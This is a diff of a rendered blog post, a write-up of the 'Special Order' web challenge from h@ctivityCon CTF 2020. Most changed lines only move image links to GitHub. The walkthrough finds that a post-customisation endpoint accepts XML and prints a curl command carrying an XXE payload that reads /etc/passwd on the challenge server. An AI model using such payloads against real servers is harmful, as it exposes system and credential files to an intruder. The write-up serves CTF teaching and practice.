@@ -1,4 +1,4 @@
-I"�|<h1 id="special-order-hctivitycon-ctf-2020">Special Order h@ctivityCon CTF 2020</h1>
+I"�~<h1 id="special-order-hctivitycon-ctf-2020">Special Order h@ctivityCon CTF 2020</h1>
 
 <p>making a big CTF challenge was always on my todo list, yes I made a couple of CTF challenges before
 but none of them actually made it to such a big event.</p>
@@ -7,30 +7,37 @@ but none of them actually made it to such a big event.</p>
 
 <p>accessing the challenge url we get redirected to <code class="highlighter-rouge">/login</code></p>
 
-<p><img src="/images/SpecialOrder/login.png" alt="login" /></p>
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Login.png" alt="login" /></p>
 
-<p>we see there’s an option to register so we register a user, then login
-<img src="/images/SpecialOrder/Blog-1.png" alt="blog" /></p>
+<p>we see there’s an option to register so we register a user, then login</p>
 
-<p>creating a post
-<img src="/images/SpecialOrder/post-1.png" alt="post-1" />
-<img src="/images/SpecialOrder/post-2.png" alt="post-2" /></p>
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Blog-1.png" alt="blog" /></p>
+
+<p>creating a post</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-1.png" alt="post-1" />
+<img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-2.png" alt="post-2" /></p>
 
 <p>also we have the ability to customize how our posts look
-<em>interesting</em>
-<img src="/images/SpecialOrder/customize-1.png" alt="customize-1" />
-<img src="/images/SpecialOrder/customize-2.png" alt="customize-2" /></p>
+<em>interesting</em></p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-1.png" alt="customize-1" /></p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-2.png" alt="customize-2" /></p>
 
 <p><del>looks ugly ngl</del></p>
 
-<p>from here we can observe that our customization input is getting to the css file
-<img src="/images/SpecialOrder/css.png" alt="css" /></p>
+<p>from here we can observe that our customization input is getting to the css file</p>
 
-<p>looking back at the request for customizing the post’s look
-<img src="/images/SpecialOrder/customize-request.png" alt="request" /></p>
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/css.png" alt="css" /></p>
 
-<p>changing the content-type header we see that the app accepts xml
-<img src="/images/SpecialOrder/customize-request.png" alt="curl" /></p>
+<p>looking back at the request for customizing the post’s look</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-request.png" alt="request" /></p>
+
+<p>changing the content-type header we see that the app accepts xml</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-request.png" alt="curl" /></p>
 
 <p>so let’s send an xxe payload</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s1">'http://ip/customize'</span> <span class="se">\</span>
@@ -39,7 +46,7 @@ but none of them actually made it to such a big event.</p>
       <span class="nt">--data-binary</span> <span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [  &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&lt;color&gt;&amp;xxe;&lt;/color&gt;&lt;size&gt;20px&lt;/size&gt;&lt;/root&gt;'</span>
 </code></pre></div></div>
 
-<p><img src="/images/SpecialOrder/passwd.png" alt="passwd" /></p>
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/passwd.png" alt="passwd" /></p>
 
 <p>now just read /flag.txt and done :)</p>
 
